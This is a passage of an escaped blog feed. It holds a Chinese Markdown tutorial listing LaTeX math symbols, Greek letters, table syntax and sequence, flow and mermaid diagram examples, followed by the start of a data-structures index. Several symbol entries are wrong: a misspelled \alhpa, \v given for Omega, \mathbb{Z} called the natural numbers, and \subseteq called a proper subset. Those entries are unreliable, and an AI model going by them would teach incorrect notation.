\[\left[ \begin{matrix} 1 &amp;amp;2 &amp;amp;\cdots &amp;amp;4\5 &amp;amp;6 &amp;amp;\cdots &amp;amp;8\\vdots &amp;amp;\vdots &amp;amp;\ddots &amp;amp;\vdots\13 &amp;amp;14 &amp;amp;\cdots &amp;amp;16\end{matrix} \right]\]

&lt;h3 id=&quot;逻辑运算&quot;&gt;逻辑运算&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;等于运算，符号：=&lt;/li&gt;
  &lt;li&gt;大于运算，符号：&amp;gt;&lt;/li&gt;
  &lt;li&gt;小于运算，符号：&amp;lt;&lt;/li&gt;
  &lt;li&gt;大于等于运算，符号：\geq&lt;/li&gt;
  &lt;li&gt;小于等于运算，符号：\leq&lt;/li&gt;
  &lt;li&gt;不等于运算，符号：\neq&lt;/li&gt;
  &lt;li&gt;不大于等于运算，符号：\ngeq&lt;/li&gt;
  &lt;li&gt;不大于等于运算，符号：\not\geq&lt;/li&gt;
  &lt;li&gt;不小于等于运算，符号：\nleq&lt;/li&gt;
  &lt;li&gt;不小于等于运算，符号：\not\leq&lt;/li&gt;
  &lt;li&gt;约等于运算，符号：\approx&lt;/li&gt;
  &lt;li&gt;恒定等于运算，符号：\equiv&lt;/li&gt;
&lt;/ul&gt;

\[x+y=z\]

\[x+y&amp;gt;z\]

\[x+y&amp;lt;z\]

\[x+y \geq z\]

\[x+y \leq z\]

\[x+y \neq z\]

\[x+y \ngeq z\]

\[x+y \not\geq z\]

\[x+y \nleq z\]

\[x+y \not\leq z\]

\[x+y \approx z\]

\[x+y \equiv z\]

&lt;h3 id=&quot;集合运算&quot;&gt;集合运算&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;属于运算，符号：\in&lt;/li&gt;
  &lt;li&gt;不属于运算，符号：\notin&lt;/li&gt;
  &lt;li&gt;不属于运算，符号：\not\in&lt;/li&gt;
  &lt;li&gt;子集运算，符号：\subset&lt;/li&gt;
  &lt;li&gt;子集运算，符号：\supset&lt;/li&gt;
  &lt;li&gt;真子集运算，符号：\subseteq&lt;/li&gt;
  &lt;li&gt;非真子集运算，符号：\subsetneq&lt;/li&gt;
  &lt;li&gt;真子集运算，符号：\supseteq&lt;/li&gt;
  &lt;li&gt;非真子集运算，符号：\supsetneq&lt;/li&gt;
  &lt;li&gt;非子集运算，符号：\not\subset&lt;/li&gt;
  &lt;li&gt;非子集运算，符号：\not\supset&lt;/li&gt;
  &lt;li&gt;并集运算，符号：\cup&lt;/li&gt;
  &lt;li&gt;交集运算，符号：\cap&lt;/li&gt;
  &lt;li&gt;差集运算，符号：\setminus&lt;/li&gt;
  &lt;li&gt;同或运算，符号：\bigodot&lt;/li&gt;
  &lt;li&gt;同与运算，符号：\bigotimes&lt;/li&gt;
  &lt;li&gt;实数集合，符号：\mathbb{R}&lt;/li&gt;
  &lt;li&gt;自然数集合，符号：\mathbb{Z}&lt;/li&gt;
  &lt;li&gt;空集，符号：\emptyset
\(x \in y\)&lt;/li&gt;
&lt;/ul&gt;

\[x \notin y\]

\[x \not\in y\]

\[x \subset y\]

\[x \supset y\]

\[x \subseteq y\]

\[x \subsetneq y\]

\[x \supseteq y\]

\[x \supsetneq y\]

\[x \not\subset y\]

\[x \not\supset y\]

\[x \cup y\]

\[x \cap y\]

\[x \setminus y\]

\[x \bigodot y\]

\[x \bigotimes y\]

\[\mathbb{R}\]

\[\mathbb{Z}\]

\[\emptyset\]

&lt;h3 id=&quot;数学符号&quot;&gt;数学符号&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;无穷，符号：\infty&lt;/li&gt;
  &lt;li&gt;虚数，符号：\imath&lt;/li&gt;
  &lt;li&gt;虚数，符号：\jmath&lt;/li&gt;
  &lt;li&gt;数学符号，符号\hat{a}&lt;/li&gt;
  &lt;li&gt;数学符号，符号\check{a}&lt;/li&gt;
  &lt;li&gt;数学符号，符号\breve{a}&lt;/li&gt;
  &lt;li&gt;数学符号，符号\tilde{a}&lt;/li&gt;
  &lt;li&gt;数学符号，符号\bar{a}&lt;/li&gt;
  &lt;li&gt;矢量符号，符号\vec{a}&lt;/li&gt;
  &lt;li&gt;数学符号，符号\acute{a}&lt;/li&gt;
  &lt;li&gt;数学符号，符号\grave{a}&lt;/li&gt;
  &lt;li&gt;数学符号，符号\mathring{a}&lt;/li&gt;
  &lt;li&gt;一阶导数符号，符号\dot{a}&lt;/li&gt;
  &lt;li&gt;二阶导数符号，符号\ddot{a}&lt;/li&gt;
  &lt;li&gt;上箭头，符号：\uparrow&lt;/li&gt;
  &lt;li&gt;上箭头，符号：\Uparrow&lt;/li&gt;
  &lt;li&gt;下箭头，符号：\downarrow&lt;/li&gt;
  &lt;li&gt;下箭头，符号：\Downarrow&lt;/li&gt;
  &lt;li&gt;左箭头，符号：\leftarrow&lt;/li&gt;
  &lt;li&gt;左箭头，符号：\Leftarrow&lt;/li&gt;
  &lt;li&gt;右箭头，符号：\rightarrow&lt;/li&gt;
  &lt;li&gt;右箭头，符号：\Rightarrow&lt;/li&gt;
  &lt;li&gt;底端对齐的省略号，符号：\ldots&lt;/li&gt;
  &lt;li&gt;中线对齐的省略号，符号：\cdots&lt;/li&gt;
  &lt;li&gt;竖直对齐的省略号，符号：\vdots&lt;/li&gt;
  &lt;li&gt;斜对齐的省略号，符号：\ddots
\(\infty\)&lt;/li&gt;
&lt;/ul&gt;

\[\imath\]

\[\jmath\]

\[\hat{a}\]

\[\check{a}\]

\[\breve{a}\]

\[\tilde{a}\]

\[\bar{a}\]

\[\vec{a}\]

\[\acute{a}\]

\[\grave{a}\]

\[\mathring{a}\]

\[\dot{a}\]

\[\ddot{a}\]

\[\uparrow\]

\[\Uparrow\]

\[\downarrow\]

\[\Downarrow\]

\[\leftarrow\]

\[\Leftarrow\]

\[\rightarrow\]

\[\Rightarrow\]

\[1,2,\ldots,n\]

\[x_1^2 + x_2^2 + \cdots + x_n^2\]

\[\vdots\]

\[\ddots\]

&lt;h3 id=&quot;希腊字母&quot;&gt;希腊字母&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;字母&lt;/th&gt;
      &lt;th&gt;实现&lt;/th&gt;
      &lt;th&gt;字母&lt;/th&gt;
      &lt;th&gt;实现&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;A&lt;/td&gt;
      &lt;td&gt;A&lt;/td&gt;
      &lt;td&gt;α&lt;/td&gt;
      &lt;td&gt;\alhpa&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;B&lt;/td&gt;
      &lt;td&gt;B&lt;/td&gt;
      &lt;td&gt;β&lt;/td&gt;
      &lt;td&gt;\beta&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Γ&lt;/td&gt;
      &lt;td&gt;\Gamma&lt;/td&gt;
      &lt;td&gt;γ&lt;/td&gt;
      &lt;td&gt;\gamma&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Δ&lt;/td&gt;
      &lt;td&gt;\Delta&lt;/td&gt;
      &lt;td&gt;δ&lt;/td&gt;
      &lt;td&gt;\delta&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;E&lt;/td&gt;
      &lt;td&gt;E&lt;/td&gt;
      &lt;td&gt;ϵ&lt;/td&gt;
      &lt;td&gt;\epsilon&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Z&lt;/td&gt;
      &lt;td&gt;Z&lt;/td&gt;
      &lt;td&gt;ζ&lt;/td&gt;
      &lt;td&gt;\zeta&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;H&lt;/td&gt;
      &lt;td&gt;H&lt;/td&gt;
      &lt;td&gt;η&lt;/td&gt;
      &lt;td&gt;\eta&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Θ&lt;/td&gt;
      &lt;td&gt;\Theta&lt;/td&gt;
      &lt;td&gt;θ&lt;/td&gt;
      &lt;td&gt;\theta&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;I&lt;/td&gt;
      &lt;td&gt;I&lt;/td&gt;
      &lt;td&gt;ι&lt;/td&gt;
      &lt;td&gt;\iota&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;K&lt;/td&gt;
      &lt;td&gt;K&lt;/td&gt;
      &lt;td&gt;κ&lt;/td&gt;
      &lt;td&gt;\kappa&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Λ&lt;/td&gt;
      &lt;td&gt;\Lambda&lt;/td&gt;
      &lt;td&gt;λ&lt;/td&gt;
      &lt;td&gt;\lambda&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;M&lt;/td&gt;
      &lt;td&gt;M&lt;/td&gt;
      &lt;td&gt;μ&lt;/td&gt;
      &lt;td&gt;\mu&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;N&lt;/td&gt;
      &lt;td&gt;N&lt;/td&gt;
      &lt;td&gt;ν&lt;/td&gt;
      &lt;td&gt;\nu&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Ξ&lt;/td&gt;
      &lt;td&gt;\Xi&lt;/td&gt;
      &lt;td&gt;ξ&lt;/td&gt;
      &lt;td&gt;\xi&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;O&lt;/td&gt;
      &lt;td&gt;O&lt;/td&gt;
      &lt;td&gt;ο&lt;/td&gt;
      &lt;td&gt;\omicron&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Π&lt;/td&gt;
      &lt;td&gt;\Pi&lt;/td&gt;
      &lt;td&gt;π&lt;/td&gt;
      &lt;td&gt;\pi&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;P&lt;/td&gt;
      &lt;td&gt;P&lt;/td&gt;
      &lt;td&gt;ρ&lt;/td&gt;
      &lt;td&gt;\rho&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Σ&lt;/td&gt;
      &lt;td&gt;\Sigma&lt;/td&gt;
      &lt;td&gt;σ&lt;/td&gt;
      &lt;td&gt;\sigma&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;T&lt;/td&gt;
      &lt;td&gt;T&lt;/td&gt;
      &lt;td&gt;τ&lt;/td&gt;
      &lt;td&gt;\tau&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Υ&lt;/td&gt;
      &lt;td&gt;\Upsilon&lt;/td&gt;
      &lt;td&gt;υ&lt;/td&gt;
      &lt;td&gt;\upsilon&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Φ&lt;/td&gt;
      &lt;td&gt;\Phi&lt;/td&gt;
      &lt;td&gt;ϕ&lt;/td&gt;
      &lt;td&gt;\phi&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;X&lt;/td&gt;
      &lt;td&gt;X&lt;/td&gt;
      &lt;td&gt;χ&lt;/td&gt;
      &lt;td&gt;\chi&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Ψ&lt;/td&gt;
      &lt;td&gt;\Psi&lt;/td&gt;
      &lt;td&gt;ψ&lt;/td&gt;
      &lt;td&gt;\psi&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Ω&lt;/td&gt;
      &lt;td&gt;\v&lt;/td&gt;
      &lt;td&gt;ω&lt;/td&gt;
      &lt;td&gt;\omega&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;表格&quot;&gt;表格&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;姓名&lt;/th&gt;
      &lt;th&gt;性别&lt;/th&gt;
      &lt;th&gt;毕业学校&lt;/th&gt;
      &lt;th&gt;工资&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;张三&lt;/td&gt;
      &lt;td&gt;男&lt;/td&gt;
      &lt;td&gt;重庆交通大学&lt;/td&gt;
      &lt;td&gt;3200&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;李四&lt;/td&gt;
      &lt;td&gt;男&lt;/td&gt;
      &lt;td&gt;贵州大学&lt;/td&gt;
      &lt;td&gt;5000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;王五&lt;/td&gt;
      &lt;td&gt;女&lt;/td&gt;
      &lt;td&gt;北京大学&lt;/td&gt;
      &lt;td&gt;2000&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;name&lt;/th&gt;
      &lt;th&gt;description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;:---&lt;/td&gt;
      &lt;td&gt;左对齐&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;---:&lt;/td&gt;
      &lt;td&gt;右对齐&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;---&lt;/td&gt;
      &lt;td&gt;居中&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;使用-sequence-画时序图&quot;&gt;使用 sequence 画时序图&lt;/h2&gt;
&lt;p&gt;注意: GitHub 暂不支持，或者说作者没有找到可用的第三方组件提供支持，所以在这你是看不到效果啦！&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-sequence&quot;&gt;title: 时序图例子
A-&amp;gt;B: 实线实箭头 
B--&amp;gt;C: 虚线实箭头 
C-&amp;gt;&amp;gt;C: 实线虚箭头 
note right of C: 自通知 
note over B,C:横跨通知 
C-&amp;gt;A:长通知 
note left of A:左通知
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;使用-flow-画流程图&quot;&gt;使用 flow 画流程图&lt;/h2&gt;
&lt;p&gt;注意: GitHub 暂不支持，或者说作者没有找到可用的第三方组件提供支持，所以在这你是看不到效果啦！&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-flow&quot;&gt;start=&amp;gt;start: 开始
isLogin=&amp;gt;condition: 是否登录
login=&amp;gt;operation: 登录
check=&amp;gt;subroutine: 校验用户信息
view=&amp;gt;operation: 浏览
end=&amp;gt;end: 结束
start-&amp;gt;isLogin
isLogin(no)-&amp;gt;login(right)-&amp;gt;check-&amp;gt;view
isLogin(yes)-&amp;gt;view
view-&amp;gt;end
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;mermaid&quot;&gt;mermaid&lt;/h2&gt;
&lt;h3 id=&quot;简介&quot;&gt;简介&lt;/h3&gt;
&lt;p&gt;Mermaid 是一个用于画流程图、状态图、时序图、甘特图的库，使用 JS 进行本地渲染，广泛集成于许多 Markdown 编辑器中。
Mermaid 作为一个使用 JS 渲染的库，生成的不是一个“图片”，而是一段 HTML 代码&lt;/p&gt;
&lt;h3 id=&quot;图表方向&quot;&gt;图表方向&lt;/h3&gt;

&lt;p&gt;| name | description |
|——|————-|
| TB   | 从上到下    |
| BT   | 从下到上    |
| RL   | 从右到左    |
| LR   | 从左到右    |&lt;/p&gt;
&lt;h3 id=&quot;节点定义&quot;&gt;节点定义&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;name&lt;/th&gt;
      &lt;th&gt;description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;id[文字]&lt;/td&gt;
      &lt;td&gt;矩形节点&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;id(文字)&lt;/td&gt;
      &lt;td&gt;圆角矩形节点&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;id((文字))&lt;/td&gt;
      &lt;td&gt;圆形节点&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;id&amp;gt;文字]&lt;/td&gt;
      &lt;td&gt;右向旗帜状节点&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;id{文字}&lt;/td&gt;
      &lt;td&gt;菱形节点&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;节点之间的连接线&quot;&gt;节点之间的连接线&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;name&lt;/th&gt;
      &lt;th&gt;description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&amp;gt;&lt;/td&gt;
      &lt;td&gt;添加尾部箭头&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-&lt;/td&gt;
      &lt;td&gt;不添加尾部箭头&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–&lt;/td&gt;
      &lt;td&gt;单线&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–text–&lt;/td&gt;
      &lt;td&gt;单线上加文字&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;==&lt;/td&gt;
      &lt;td&gt;粗线&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;==text==&lt;/td&gt;
      &lt;td&gt;粗线加文字&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-.-&lt;/td&gt;
      &lt;td&gt;虚线&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-.text.-&lt;/td&gt;
      &lt;td&gt;虚线加文字&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-&amp;gt;&lt;/td&gt;
      &lt;td&gt;无箭头的实线&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–&amp;gt;&lt;/td&gt;
      &lt;td&gt;无箭头的虚线&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-&amp;gt;&amp;gt;&lt;/td&gt;
      &lt;td&gt;有箭头的实线&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–&amp;gt;&amp;gt;&lt;/td&gt;
      &lt;td&gt;有箭头的虚线&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-x&lt;/td&gt;
      &lt;td&gt;末端为叉的实线（表示异步）&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–x&lt;/td&gt;
      &lt;td&gt;末端为叉的虚线（表示异步）&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;mermaid-流程图&quot;&gt;mermaid: 流程图&lt;/h3&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;graph TB
A&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;开始&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; B[Round edge]
B &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; C&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Decision&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
C &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;|Y| D[Result one]
C &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;|N| E[Result two]
E &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;F
subgraph 子图表名称
F &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; This is the text &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; H
H &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; I&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;H-I&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
I &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; J&amp;gt;I-J]
end
H &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Z&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;结束&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
D &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Z
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;pre&gt;&lt;code class=&quot;language-mermaid&quot;&gt;graph TB;
A(开始) --&amp;gt;B[Round edge]
B --&amp;gt; C{Decision}
C --&amp;gt;|Y| D[Result one]
C --&amp;gt;|N| E[Result two]
E --&amp;gt;F
subgraph 子图表名称
	F --&amp;gt; H
	H --&amp;gt; I((H-I))
	I --&amp;gt; J&amp;gt;I-J]
end
H --&amp;gt; Z(结束)
D --&amp;gt; Z
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;mermaid-序列图&quot;&gt;mermaid: 序列图&lt;/h3&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sequenceDiagram
    participant Alice
    participant Bob
    Alice-&amp;gt;John: Hello John, how are you?
    loop Healthcheck
        John-&amp;gt;John: Fight against hypochondria
    end
    Note right of John: Rational thoughts &amp;lt;br/&amp;gt;prevail...
    John--&amp;gt;Alice: Great!
    John-&amp;gt;Bob: How about you?
    Bob--&amp;gt;John: Jolly good!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;pre&gt;&lt;code class=&quot;language-mermaid&quot;&gt;sequenceDiagram
    participant Alice
    participant Bob
    Alice-&amp;gt;John: Hello John, how are you?
    loop Healthcheck
        John-&amp;gt;John: Fight against hypochondria
    end
    Note right of John: Rational thoughts &amp;lt;br/&amp;gt;prevail...
    John--&amp;gt;Alice: Great!
    John-&amp;gt;Bob: How about you?
    Bob--&amp;gt;John: Jolly good!
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;mermaid-甘特图&quot;&gt;mermaid: 甘特图&lt;/h3&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gantt
        dateFormat  YYYY-MM-DD
        title Adding GANTT diagram functionality to mermaid
        section A section
        Completed task            :done,    des1, 2014-01-06,2014-01-08
        Active task               :active,  des2, 2014-01-09, 3d
        Future task               :         des3, after des2, 5d
        Future task2               :         des4, after des3, 5d
        section Critical tasks
        Completed task in the critical line :crit, done, 2014-01-06,24h
        Implement parser and jison          :crit, done, after des1, 2d
        Create tests for parser             :crit, active, 3d
        Future task in critical line        :crit, 5d
        Create tests for renderer           :2d
        Add to mermaid                      :1d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;pre&gt;&lt;code class=&quot;language-mermaid&quot;&gt;gantt
	dateFormat  YYYY-MM-DD
	title Adding GANTT diagram functionality to mermaid
	section A section
	Completed task            :done,    des1, 2014-01-06,2014-01-08
	Active task               :active,  des2, 2014-01-09, 3d
	Future task               :         des3, after des2, 5d
	Future task2               :         des4, after des3, 5d
	section Critical tasks
	Completed task in the critical line :crit, done, 2014-01-06,24h
	Implement parser and jison          :crit, done, after des1, 2d
	Create tests for parser             :crit, active, 3d
	Future task in critical line        :crit, 5d
	Create tests for renderer           :2d
	Add to mermaid                      :1d
&lt;/code&gt;&lt;/pre&gt;</content><author><name>zrg</name></author><category term="Markdown" /><summary type="html">标题 #,一级标题 ##,二级标题 ###,三级标题 列表 1. 有序列表 2. 有序列表 3. 无序列表</summary></entry><entry><title type="html">数据结构与算法</title><link href="http://localhost:4000/algorithms/2019/02/13/data-structure-algorithms/" rel="alternate" type="text/html" title="数据结构与算法" /><published>2019-02-13T00:00:00+08:00</published><updated>2019-02-13T00:00:00+08:00</updated><id>http://localhost:4000/algorithms/2019/02/13/data-structure-algorithms</id><content type="html" xml:base="http://localhost:4000/algorithms/2019/02/13/data-structure-algorithms/">&lt;div id=&quot;outline-container-org8961a9d&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org8961a9d&quot;&gt;数据结构和算法目录&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org8961a9d&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
首先明确一点：程序=数据结构+算法
&lt;/pre&gt;

&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 1:&lt;/span&gt; 数据结构和算法表&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;线性结构&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;树&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;堆&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;图&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;排序算法&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;数组、单链表和双链表&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;二叉查找树&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;二叉堆&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;图的理论基础&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;冒泡排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;Linux内核中双向链表的经典实现&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;AVL树&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;左倾堆&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;无向图&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;快速排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;栈&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;伸展树&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;斜堆&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;有向图&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;插入排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;队列&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;红黑树&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;二项堆&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;深度优先搜索和广度优先搜索&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;希尔排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;哈夫曼树&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;斐波那契堆&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;拓扑排序&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;选择排序&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;&amp;#xa0;&lt;/td&gt;
